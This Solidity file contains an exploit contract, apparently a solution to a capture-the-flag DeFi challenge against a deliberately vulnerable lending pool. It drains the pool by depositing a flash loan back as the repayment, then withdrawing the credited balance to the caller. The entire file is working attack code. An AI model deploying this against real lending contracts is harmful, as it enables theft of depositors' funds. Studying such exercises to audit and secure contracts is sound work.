// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttack is IFlashLoanEtherReceiver {
    ISideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    receive() external payable {}

    function exploit() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
